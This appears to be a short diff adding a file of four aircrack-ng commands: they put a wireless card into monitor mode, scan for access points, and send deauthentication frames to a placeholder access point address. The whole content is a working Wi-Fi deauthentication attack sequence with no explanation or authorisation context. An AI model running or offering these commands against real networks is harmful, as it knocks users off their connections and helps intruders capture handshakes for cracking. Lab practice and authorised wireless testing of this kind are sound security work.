@@ -1,0 +1,4 @@
+airmon-ng start wlan1
+airodump-ng wlan1
+airodump-ng -c 1 wlan1
+aireplay-ng --deauth 10 -a TR:GT:AP:BS:SS:ID wlan1
